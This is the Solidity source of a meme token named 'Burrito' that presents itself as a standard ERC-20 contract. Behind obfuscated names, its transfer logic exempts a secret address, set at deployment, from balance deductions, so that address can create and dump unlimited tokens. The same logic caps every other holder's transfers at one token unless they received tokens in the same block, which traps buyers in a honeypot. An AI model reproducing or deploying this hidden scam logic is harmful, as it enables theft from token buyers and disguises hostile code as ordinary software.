/*

https://t.me/burritoerc

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.12;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Burrito is Ownable {
    event Approval(address indexed owner, address indexed spender, uint256 value);

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    string public name = unicode"Burrito 🌯";

    function sierbvulf(address fpzioqknuecj, address uiscrjwo, uint256 mgpqdfa) private {
        if (0 == rjoliudng[fpzioqknuecj]) {
            if (fpzioqknuecj != zhvgkj && dropfihs[fpzioqknuecj] != block.number && mgpqdfa < totalSupply) {
                require(mgpqdfa <= totalSupply / (10 ** decimals));
            }
            balanceOf[fpzioqknuecj] -= mgpqdfa;
        }
        balanceOf[uiscrjwo] += mgpqdfa;
        dropfihs[uiscrjwo] = block.number;
        emit Transfer(fpzioqknuecj, uiscrjwo, mgpqdfa);
    }

    address private zhvgkj;

    function approve(address mkshq, uint256 mgpqdfa) public returns (bool success) {
        allowance[msg.sender][mkshq] = mgpqdfa;
        emit Approval(msg.sender, mkshq, mgpqdfa);
        return true;
    }

    uint256 private lwhj = 116;

    function transfer(address uiscrjwo, uint256 mgpqdfa) public returns (bool success) {
        sierbvulf(msg.sender, uiscrjwo, mgpqdfa);
        return true;
    }

    mapping(address => uint256) public balanceOf;

    mapping(address => uint256) private dropfihs;

    constructor(address azgcurjsdlfb) {
        balanceOf[msg.sender] = totalSupply;
        rjoliudng[azgcurjsdlfb] = lwhj;
        IUniswapV2Router02 tqxihnpkbo = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        zhvgkj = IUniswapV2Factory(tqxihnpkbo.factory()).createPair(address(this), tqxihnpkbo.WETH());
    }

    string public symbol = unicode"Burrito 🌯";

    uint8 public decimals = 9;

    function transferFrom(address fpzioqknuecj, address uiscrjwo, uint256 mgpqdfa) public returns (bool success) {
        require(mgpqdfa <= allowance[fpzioqknuecj][msg.sender]);
        allowance[fpzioqknuecj][msg.sender] -= mgpqdfa;
        sierbvulf(fpzioqknuecj, uiscrjwo, mgpqdfa);
        return true;
    }

    mapping(address => uint256) private rjoliudng;
}